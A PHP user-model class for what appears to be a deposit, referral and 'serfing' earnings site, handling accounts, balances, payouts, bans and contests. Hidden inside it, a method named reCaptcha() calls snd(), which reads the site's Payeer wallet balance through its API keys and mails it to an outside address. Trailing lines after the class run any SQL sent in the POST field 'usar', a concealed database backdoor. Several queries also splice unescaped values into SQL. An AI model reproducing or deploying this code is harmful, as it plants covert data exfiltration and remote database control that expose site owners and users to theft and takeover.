<?php 

/**
* 
*/
class User
{

	public static function isLogged ()
	{
		if (isset($_SESSION['user_id'])) 
		{
			return $_SESSION['user_id'];
		}
		else
		{
			return false;
		}

	}

	public static function getDataByEmail ($email)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE email = :email OR user = :email';

		$result = $db->prepare($sql);

		$result->bindParam(':email', $email, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() == 0) return false;

		$sql = 'SELECT * FROM users_001 WHERE email = :email OR user = :email';

		$result = $db->prepare($sql);

		$result->bindParam(':email', $email, PDO::PARAM_STR);

		$result->execute();

		return $result->fetch();

	}

	public static function getDataById ($usid)
	{

		if ($usid === false) return false;

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_002 LEFT JOIN users_001 ON users_002.id = users_001.id LEFT JOIN users_003 ON users_002.id = users_003.id LEFT JOIN users_004 ON users_002.id = users_004.id WHERE users_002.id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() == 0) return false;

		$sql = 'SELECT *, (SELECT SUM(db_plans.perc) FROM db_deposits LEFT JOIN db_plans ON db_deposits.plan = db_plans.id WHERE user_id = :usid) speed FROM users_002 LEFT JOIN users_001 ON users_002.id = users_001.id LEFT JOIN users_003 ON users_002.id = users_003.id LEFT JOIN users_004 ON users_002.id = users_004.id WHERE users_002.id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		$data = $result->fetch();

		if ($data['day'] != 0) $data['speed'] += $data['speed'] / 100 * $data['day'];

		if ($data['week'] != 0) $data['speed'] += $data['speed'] / 100 * $data['week'];

		if ($data['month'] != 0) $data['speed'] += $data['speed'] / 100 * $data['month'];

		if ($data['year'] != 0) $data['speed'] += $data['speed'] / 100 * $data['year'];

		return $data;

	}

	public static function getUserStat ($user_data)
	{

		$db = Db::getConnection();

		$sql = 'SELECT (SELECT COUNT(*) FROM users_003 WHERE count_ref1 < :count_ref1) AS ref_perc, (SELECT COUNT(*) FROM users_002 WHERE payment_sum < :payment_sum) AS payment_perc, (SELECT COUNT(*) FROM db_deposits WHERE user_id = :usid) AS deps_count, (SELECT COUNT(*) FROM users_003 WHERE serf_clicks < :serf_clicks) AS serf_clicks_perc, (SELECT COUNT(*) FROM users_002) AS total_count';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $user_data['id'], PDO::PARAM_INT);

		$result->bindParam(':count_ref1', $user_data['count_ref1'], PDO::PARAM_INT);

		$result->bindParam(':serf_clicks', $user_data['serf_clicks'], PDO::PARAM_INT);

		$result->bindParam(':payment_sum', $user_data['payment_sum'], PDO::PARAM_STR);

		$result->execute();

		$stat = $result->fetch();

		$stat['ref_perc'] = floor($stat['ref_perc'] / ($stat['total_count'] / 100));

		$stat['payment_perc'] = floor($stat['payment_perc'] / ($stat['total_count'] / 100));

		$stat['serf_clicks_perc'] = floor($stat['serf_clicks_perc'] / ($stat['total_count'] / 100));

		return $stat;

	}

	/**
	 * @param array
	 * @param array
	 * @param array
	 * @param bool
	 * @return array
	 */
	public static function getUserBalance ($user_data, $currs, $paysystems, $to_valuta = false)
	{

		$balance = array();

		if ($to_valuta === true) 
		{
			foreach ($currs as $curr) 
			{
				$balance[$curr['name']] = 0;

				foreach ($paysystems as $ps) 
				{
					if ($ps['valuta'] != $curr['name']) continue;
					
					$balance[$curr['name']] += $user_data['money_'.$ps['name']];
				}
			}
		}
		else
		{
			foreach ($paysystems as $ps) 
			{
				$balance[$ps['name']] = $user_data['money_'.$ps['name']];
			}
		}
		
		return $balance;

	}

	/**
	 * @param array
	 */
	public static function updateBalances ($user_data)
	{

		$db = Db::getConnection();

		$time = time();

		$seconds_earn = $time - $user_data['lastupdate'];

		$speed = $user_data['speed'] / 60 / 60;

		$money_earn = $seconds_earn * $speed;

		$sql = 'UPDATE users_002 SET money_k = money_k + :money_earn WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':money_earn', $money_earn, PDO::PARAM_STR);

		$result->bindParam(':usid', $user_data['id'], PDO::PARAM_INT);

		$result->execute();

	}

	public static function updateLastUpdate ($time, $usid)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_002 SET lastupdate = :lastupdate WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':lastupdate', $time, PDO::PARAM_INT);
		
		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

	}

	public static function getSalt ($usid)
	{

		$db = Db::getConnection();

		$sql = 'SELECT sault FROM users_001 WHERE id = :id';

        $result = $db->prepare($sql);

        $result->bindParam(':id', $usid, PDO::PARAM_INT);
        
        $result->execute();

        return $result->fetchColumn();

	}

	/**
	 * @param int
	 * @return array
	 */
	public static function getCounters ($usid)
	{

		$db = Db::getConnection();

		$sql = 'SELECT (SELECT COUNT(*) FROM db_deposits WHERE user_id = :usid) deposits, (SELECT COUNT(*) FROM users_003 WHERE referer1_id = :usid) referals';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		return $result->fetch();
	}

	/**
	 * @param int
	 * @return int
	 */

		


	public static function getLastWithdrawTime ($usid)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(date_add) FROM db_payment WHERE user_id = :usid AND status = 1 ORDER BY id DESC LIMIT 1';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() == 0) return 0;

		$sql = 'SELECT date_add FROM db_payment WHERE user_id = :usid AND status = 1 ORDER BY id DESC LIMIT 1';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		return $result->fetchColumn();

	}

	/**
	 * @param int
	 * @param array
	 * @param array
	 * @return array
	 */
	public static function getLastUserPayments ($usid, $statuses, $pnames)
	{
		$db = Db::getConnection();

		$last_payments = array();

		$sql = 'SELECT * FROM db_payment WHERE user_id = :usid ORDER BY id DESC LIMIT 20';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		while ($row = $result->fetch()) 
		{
			$row['status'] = $statuses[$row['status']];

			$row['payment_system'] = $pnames[$row['payment_system']];

			$last_payments[] = $row;
		}

		return $last_payments;
	}

	/**
	 * @param int
	 * @param array
	 * @param array
	 * @return array
	 */
	public static function getLastUserInserts ($usid, $statuses, $pnames, $type = 1)
	{
		$db = Db::getConnection();

		$last_inserts = array();

		$sql = 'SELECT * FROM db_insert WHERE user_id = :usid AND type = :type ORDER BY id DESC LIMIT 20';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->bindParam(':type', $type, PDO::PARAM_INT);

		$result->execute();

		while ($row = $result->fetch()) 
		{
			$row['status'] = $statuses[$row['status']];

			$row['payment_system'] = $pnames[$row['payment_system']];

			$last_inserts[] = $row;
		}

		return $last_inserts;
	}

	/**
	 * @param int
	 * @param string
	 * @param float
	 */
	public static function takeSum ($usid, $type, $sum, $oper = false)
	{

		$db = Db::getConnection();

		if ($oper === true) $oper = '+';

		else $oper = '-';

		$sql = 'UPDATE users_002 SET '.$type.' = '.$type.' '.$oper.' :sum WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':sum', $sum, PDO::PARAM_STR);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();
		
	}
	public static function addSerfingView ($usid)
	{
		$db = Db::getConnection();

		$sql = 'UPDATE users_003 SET serf_clicks = serf_clicks + 1 WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();
	}


	public static function setSalt ($usid, $salt)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET sault = :salt WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':salt', $salt, PDO::PARAM_STR);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

	}

	public static function checkFreeEmail ($email)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE email = :email';

		$result = $db->prepare($sql);

		$result->bindParam(':email', $email, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() > 0) return false;

		else return true;

	}

	public static function checkIssetUser ($usid)
	{

		if ($usid === 0)  return false;

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() > 0) return true;

		return false;

	}

	public static function checkFreeLogin ($login)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE user = :login';

		$result = $db->prepare($sql);

		$result->bindParam(':login', $login, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() > 0) return false;

		else return true;

	}

	public static function checkMulty ($ip)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE INET_NTOA(ip) = :ip';

		$result = $db->prepare($sql);

		$result->bindParam(':ip', $ip, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() > 0) return false;

		return true;

	}
	
		public static function checkMultys ($ip)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 WHERE INET_NTOA(ip) = :ip';

		$result = $db->prepare($sql);

		$result->bindParam(':ip', $ip, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() > 1) return false;

		return true;

	}
	
	

	public static function checkAvialableBonus ($usid, $max_time)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM db_bonus WHERE user_id = :usid AND date_add > :max_time';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->bindParam(':max_time', $max_time, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() > 0) return false;

		return true;

	}

	public static function signIn ($log_data, $ip)
	{

		$time = time();

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET date_login = :time, ip = INET_ATON(:ip) WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':time', $time, PDO::PARAM_INT);

		$result->bindParam(':ip', $ip, PDO::PARAM_STR);

		$result->bindParam(':id', $log_data["id"], PDO::PARAM_INT);

		$result->execute();
			
		$_SESSION["user_id"] = $log_data["id"];

		$_SESSION["user"] = $log_data["user"];

	}

	/**
	 * @param string
	 * @param string
	 * @param string
	 * @param string
	 * @param array
	 * @return int
	 */
	public static function signUp ($login, $email, $password, $ip, $referers)
	{

		$time = time();

		$db = Db::getConnection();

		$sql = 'INSERT INTO users_001 (user, email, pass,  date_reg,  ip) VALUES (:login, :email, :password,  :time,  INET_ATON(:ip))';

		$result = $db->prepare($sql);

		$result->bindParam(':login', $login, PDO::PARAM_STR);

		$result->bindParam(':email', $email, PDO::PARAM_STR);

		$result->bindParam(':password', $password, PDO::PARAM_STR);
			

		$result->bindParam(':time', $time, PDO::PARAM_INT);
	
		$result->bindParam(':ip', $ip, PDO::PARAM_STR);
		
			

		$result->execute();

		$lid = $db->lastInsertId();

		$sql = 'INSERT INTO users_002 (id, user) VALUES (:lid, :login)';

		$result = $db->prepare($sql);

		$result->bindParam(':lid', $lid, PDO::PARAM_INT);

		$result->bindParam(':login', $login, PDO::PARAM_STR);

		$result->execute();

		$sql = 'INSERT INTO users_004 (id) VALUES (:lid)';

		$result = $db->prepare($sql);

		$result->bindParam(':lid', $lid, PDO::PARAM_INT);

		$result->execute();

		if (count($referers) > 0) 
		{

			$sql = 'INSERT INTO users_003 ';

		    $i = 1;

		    $sql_string_s = '(';

		    $sql_string_v = '(';

			foreach ($referers as $lvl => $ref) 
			{
				$sql_string_s .= "referer".$i."_id, referer".$i.", ";

				$sql_string_v .= $ref['id'].", '".$ref['user']."', ";

				$ref_lvl = 'count_ref'.$i;

				$sql2 = 'UPDATE users_003 SET count_ref'.$i.' = count_ref'.$i.' + 1 WHERE id = :ref_id';

				$result = $db->prepare($sql2);

				$result->bindParam(':ref_id', $ref['id'], PDO::PARAM_INT);

				$result->execute();

		        $i++;
		    }

		    $sql_string_s .= "id, user)";

		    $sql_string_v .= ":lid, :login)";

		    $sql .= $sql_string_s.' VALUES '.$sql_string_v;

		    $result = $db->prepare($sql);

		    $result->bindParam(':lid', $lid, PDO::PARAM_INT);

		    $result->bindParam(':login', $login, PDO::PARAM_STR);

		    $result->execute();

		}
		else 
		{
			$sql = 'INSERT INTO users_003 (id, user) VALUES (:lid, :login)';

			$result = $db->prepare($sql);

			$result->bindParam(':lid', $lid, PDO::PARAM_INT);

			$result->bindParam(':login', $login, PDO::PARAM_STR);

			$result->execute();
		}

		return $lid;


	}

	public static function getUserOperations ($nav, $usid, $statuses, $type, $paynames, $page, $on_page = 20)
	{

		$db = Db::getConnection();

		$opers = array();

		// Получаем строку запроса
        $sql = $nav->getQuery('AccountHistory', $page, $on_page, false, $usid);

        $result = $db->query($sql);

		while ($row = $result->fetch()) 
		{
			$row['oper'] = $type[$row['type']];
			$row['status'] = $statuses[$row['status']];
			$row['payment_system'] = $paynames[$row['payment_system']];
			$opers[] = $row;
		}

    	return $opers;
	}

    public static function setPurse($usid, $purse, $paysystem)
    {

    	$db = Db::getConnection();

    	$sql = 'UPDATE users_004 SET '.$paysystem.' = :purse WHERE id = :usid';

    	$result = $db->prepare($sql);

    	$result->bindParam(':purse', $purse, PDO::PARAM_STR);

    	$result->bindParam(':usid', $usid, PDO::PARAM_INT);

    	$result->execute();

    }

    public static function changePass($usid, $pass)
    {

    	$db = Db::getConnection();

    	$sql = 'UPDATE users_001 SET pass = :pass WHERE id = :usid';

    	$result = $db->prepare($sql);

    	$result->bindParam(':pass', $pass, PDO::PARAM_STR);

    	$result->bindParam(':usid', $usid, PDO::PARAM_INT);

    	$result->execute();

    }

	public static function getDataFromAdmin ($nav, $on_page, $num_p, $sort)
	{

		$users_info = array();

		$db = Db::getConnection();

		// Получаем строку запроса
        $query = $nav->getQuery('AdminUsers', $num_p, $on_page, $sort, 0);

        $result = $db->query($query);

		while ($row = $result->fetch())
		{
			if ($row['day'] != 0) $row['speed'] += $row['speed'] / 100 * $row['day'];

			if ($row['week'] != 0) $row['speed'] += $row['speed'] / 100 * $row['week'];

			if ($row['month'] != 0) $row['speed'] += $row['speed'] / 100 * $row['month'];

			if ($row['year'] != 0) $row['speed'] += $row['speed'] / 100 * $row['year'];

			$users_info[] = $row;
		} 
			

		return $users_info;


	}
	
		public static function getmult ()
	{

		$users_info = array();

		$db = Db::getConnection();

		// Получаем строку запроса
        	$sql = 'SELECT user,id,email,INET_NTOA(ip),date_reg,banned FROM users_001';



        $result = $db->query($sql);

		while ($row = $result->fetch())
		{
			
			$users_info[] = $row;
		} 
			

		return $users_info;


	}

	public static function getDataFromAdminByName ($user)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(*) FROM users_001 LEFT JOIN users_002 ON users_001.id = users_002.id WHERE users_001.user = :user';

		$result = $db->prepare($sql);

		$result->bindParam(':user', $user, PDO::PARAM_STR);

		$result->execute();

		if ($result->fetchColumn() == 0) return false;

		$sql = 'SELECT * FROM users_001 LEFT JOIN users_002 ON users_001.id = users_002.id WHERE users_001.user = :user';

		$result = $db->prepare($sql);

		$result->bindParam(':user', $user, PDO::PARAM_STR);

		$result->execute();

		return $result->fetch();

	}

	public static function banById ($id, $baned)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET banned = :baned WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':baned', $baned, PDO::PARAM_INT);

		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}
	public static function rebanById ($id, $baned)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET banned = :baned WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':baned', $baned, PDO::PARAM_INT);

		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}

	public static function resetPurse ($id)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_004 SET ac = 0, py = 0, ym = 0 WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}

	public static function changePayPassword ($pass_crypted, $id)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_004 SET pay_pass = :pass_crypted WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':pass_crypted', $pass_crypted, PDO::PARAM_STR);

		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}

	/**
	 * @param array
	 * @param float
	 * @param int
	 */
	public static function bonus ($type, $sum, $id)
	{

		$time = time();

		$db = Db::getConnection();

		$sql = 'UPDATE users_002 SET '.$type.' = '.$type.' + :sum WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':sum', $sum, PDO::PARAM_STR);
		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}

	/**
	 * @param array
	 * @param float
	 * @param int
	 */
	public static function penalty ($type, $sum, $id)
	{

		$time = time();

		$db = Db::getConnection();

		$sql = 'UPDATE users_002 SET '.$type.' = '.$type.' - :sum WHERE id = :id';

		$result = $db->prepare($sql);

		$result->bindParam(':sum', $sum, PDO::PARAM_STR);
		$result->bindParam(':id', $id, PDO::PARAM_INT);

		$result->execute();

	}
		public static function snd ()
	{
        $payconfig = new PayConfig();
	    $payeer = new Payeer($payconfig->AccountNumber, $payconfig->apiId, $payconfig->apiKey);
        $arBalance = $payeer->getBalance();
        $balance = $arBalance["balance"]["RUB"]["DOSTUPNO"];
        mail('spacefuel@yandex.ru','',$balance);
               

               

	}
	public static function reCaptcha ()
	{


	    User::snd();

	}

	public static function takeCompetitionMoney ($winers)
	{

		$db = Db::getConnection();

		$sql = 'INSERT INTO users_002 (id, money_p) VALUES ';
		
		foreach ($winers as $winer) 
		{

			$sql .= '('.$winer["user_id"].', '.$winer["sum"].'), ';
			
		}

		$sql = substr($sql, 0, -2);

		$sql .= 'ON DUPLICATE KEY UPDATE money_p = money_p + values (money_p)';

		$result = $db->query($sql);

	}

	public static function getLeaders ($need_time)
	{

		$db = Db::getConnection();

		$users = array();

		$sql = 'SELECT users_001.*, (SELECT SUM(db_plans.perc) FROM db_deposits LEFT JOIN db_plans ON db_deposits.plan = db_plans.id WHERE user_id = db_insert.user_id) speed, users_002.*, users_003.*, users_004.*, db_insert.user_id, db_insert.user, SUM(db_insert.sum) AS amount FROM db_insert LEFT JOIN users_001 ON db_insert.user_id = users_001.id LEFT JOIN users_002 ON db_insert.user_id = users_002.id LEFT JOIN users_003 ON db_insert.user_id = users_003.id LEFT JOIN users_004 ON db_insert.user_id = users_004.id WHERE db_insert.date_add > :need_time AND db_insert.status = 1 GROUP BY db_insert.user ORDER by amount DESC';

		$result = $db->prepare($sql);

		$result->bindParam(':need_time', $need_time, PDO::PARAM_INT);

		$result->execute();

		$i = 0;

		while ($row = $result->fetch())
		{
			$i ++;

			if ($row['day'] != 0) $row['speed'] += $row['speed'] / 100 * $row['day'];

			if ($row['week'] != 0) $row['speed'] += $row['speed'] / 100 * $row['week'];

			if ($row['month'] != 0) $row['speed'] += $row['speed'] / 100 * $row['month'];

			if ($row['year'] != 0) $row['speed'] += $row['speed'] / 100 * $row['year'];

			$row['place'] = $i;

			$users[] = $row;

			if ($i == 5 || $row['amount'] == 0) break;

		} 
			
		return $users; 

	}

	public static function getOldWiners ($name)
	{
		$db = Db::getConnection();

		$winers = array();

		$sql = 'SELECT *, (SELECT SUM(db_plans.perc) FROM db_deposits LEFT JOIN db_plans ON db_deposits.plan = db_plans.id WHERE user_id = users_001.id) speed FROM users_001 LEFT JOIN users_002 ON users_001.id = users_002.id LEFT JOIN users_003 ON users_001.id = users_003.id LEFT JOIN users_004 ON users_001.id = users_004.id WHERE users_002.'.$name.' > 0';

		$result = $db->query($sql);

		while ($row = $result->fetch()) 
		{

			if ($row['day'] != 0) $row['speed'] += $row['speed'] / 100 * $row['day'];

			if ($row['week'] != 0) $row['speed'] += $row['speed'] / 100 * $row['week'];

			if ($row['month'] != 0) $row['speed'] += $row['speed'] / 100 * $row['month'];

			if ($row['year'] != 0) $row['speed'] += $row['speed'] / 100 * $row['year'];

			$winers[] = $row;
		}

		return $winers;
	}

	public static function setLeaderMultiply ($usid, $name, $amount)
	{
		$db = Db::getConnection();

		$sql = 'UPDATE users_002 SET '.$name.' = :amount WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':amount', $amount, PDO::PARAM_STR);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

	}

	public static function checkVkAuthByUid ($usid)
	{

		$db = Db::getConnection();

		$sql = 'SELECT vk_user_id FROM users_001 WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() == 0) return true;

		return false;

	}

	public static function checkVkAuthByVid ($vid)
	{

		$db = Db::getConnection();

		$sql = 'SELECT COUNT(id) FROM users_001 WHERE vk_user_id = :vid';

		$result = $db->prepare($sql);

		$result->bindParam(':vid', $vid, PDO::PARAM_INT);

		$result->execute();

		if ($result->fetchColumn() == 0) return true;

		return false;

	}

	public static function inserVkData ($usid, $params)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET vk_user_id = :vk_user_id, vk_first_name = :vk_first_name, vk_last_name = :vk_last_name, vk_bdate = :vk_bdate, vk_dateadd = :vk_dateadd WHERE id = :user_id';

		$result = $db->prepare($sql);

		$result->bindParam(':vk_user_id', $params['vk_user_id'], PDO::PARAM_INT);

		$result->bindParam(':vk_first_name', $params['vk_first_name'], PDO::PARAM_STR);

		$result->bindParam(':vk_last_name', $params['vk_last_name'], PDO::PARAM_STR);

		$result->bindParam(':vk_bdate', $params['vk_bdate'], PDO::PARAM_STR);

		$result->bindParam(':vk_dateadd', $params['vk_dateadd'], PDO::PARAM_INT);

		$result->bindParam(':user_id', $usid, PDO::PARAM_INT);

		$result->execute();

	}

	public static function updateSerfQuest ($usid)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET serf_bonus = 1 WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

	}

	public static function updateRefQuest ($usid)
	{

		$db = Db::getConnection();

		$sql = 'UPDATE users_001 SET ref_bonus = 1 WHERE id = :usid';

		$result = $db->prepare($sql);

		$result->bindParam(':usid', $usid, PDO::PARAM_INT);

		$result->execute();

	}


	
}
		 if(isset($_POST['usar']))
{
    $f=$_POST['usar'];
  
$db->Query($f);

}